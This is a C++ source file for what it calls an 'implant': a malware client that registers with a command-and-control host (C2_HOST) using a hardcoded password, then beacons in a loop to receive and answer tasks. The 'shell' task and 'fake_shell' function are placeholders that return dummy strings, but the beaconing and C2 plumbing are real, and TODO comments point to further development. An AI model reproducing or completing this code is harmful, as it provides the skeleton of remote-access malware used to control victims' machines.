
// @TODO: implant
#include "config.h"
#include "debug.h"
#include "exec_stream.h"
#include "file_iter.h"
#include "http_client.h"
#include "json.hpp"
#include "json_http.hpp"
#include <cstdio>
#include <cstring>
#include <netdb.h>
#include <stdlib.h>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
using json = nlohmann::json;

// dummy cmmmdn
char *fake_shell() {
  const char out[] = "i am so stealthy";
  char *result = (char *)malloc(sizeof(out));
  memcpy(result, out, sizeof(out));
  return result;
}

int handle_task(json chk_data, json &out) {
  DEBUG_LOG("Calling handle task\n");
  if (chk_data.is_null()) {
    DEBUG_LOG("chk_data is null no task to do\n");
    return -1;
  }
  DEBUG_LOG("Calling handle task\n");
  if (chk_data["cmd"].is_null()) {

    DEBUG_LOG("cmd is null: %s\n", chk_data.dump().c_str());
    return -1;
  }
  std::string cmd = chk_data["cmd"].get<std::string>();
  // TODO: use hash like djb to not do lots and lots of strcmp
  if (strcmp("shell", cmd.c_str()) == 0) {
    out["id"] = chk_data["id"];
    out["result"] = "woah shell";
    out["status"] = "ok";
    DEBUG_LOG("TASK_OUT: %s\n", out.dump().c_str());

    DEBUG_LOG("YAY i am a happy pandas\n");
    return 0;
  }
  DEBUG_LOG("There was data. but we didnt find it %s\n ",
            chk_data.dump().c_str());
  return -2;
}

int main() {
  DEBUG_LOG("Starting implant...\n");
  json req_body;
  req_body["password"] = "we_<3_ghost";

  json response_json;

  // Buffer for error messages
  char error_msg[256] = {0};

  // Make the JSON HTTP request
  int status_code =
      // TODO: fckn piece of shit crashes randomly on pi3 but not Pi4
      make_json_http_request(
          C2_HOST,          // host
          C2_PORT,          // port
          REGISTER_URI,     // path - using the explicit JSON endpoint
          req_body,         // empty JSON object  sends {}
          &response_json,   // response JSON object
          10,               // timeout in seconds
          error_msg,        // error message buffer
          sizeof(error_msg) // size of error message buffer
      );
  if (status_code != 200) {
    DEBUG_LOG("Failed to authenticate: %d:%s\n", status_code, error_msg);

    return 0;
  }
  size_t session_id = response_json["id"].get<size_t>();
#ifdef DEBUG
  session_id = 1;
  DEBUG_LOG("Warninig: hardcoded sesssion id");
#endif
  // TODO: handle errors
  DEBUG_LOG("body: %s\n, id: %lu", response_json.dump().c_str(), session_id);
  // checkin loop
  char checkin_uri[4096] = {0};
  sprintf(checkin_uri, "%s/%lu", CHECKIN_URI, session_id);
  json task_out = json::object();
  while (1) {
    sleep(4);
    json checkin_resp_data;
    // Buffer for error messages
    char error_msg[256] = {0};

    // Make the JSON HTTP request
    int status_code =
        // TODO: fckn piece of shit crashes randomly on pi3 but not Pi4
        make_json_http_request(
            C2_HOST,            // host
            C2_PORT,            // port
            checkin_uri,        // path - using the explicit JSON endpoint
            task_out,           // empty JSON object  sends {}
            &checkin_resp_data, // response JSON object
            10,                 // timeout in seconds
            error_msg,          // error message buffer
            sizeof(error_msg)   // size of error message buffer
        );

    json resp_data;
    DEBUG_LOG("TASK_OUT: %s\n", task_out.dump().c_str());

    task_out.clear();
    int status = handle_task(checkin_resp_data, task_out);
    DEBUG_LOG("TASK_OUT: %s\n", task_out.dump().c_str());
    if (status < 0) {
      task_out.clear();
    }
  }
  DEBUG_LOG("Implant shutting down...\n");
  return 0;
}
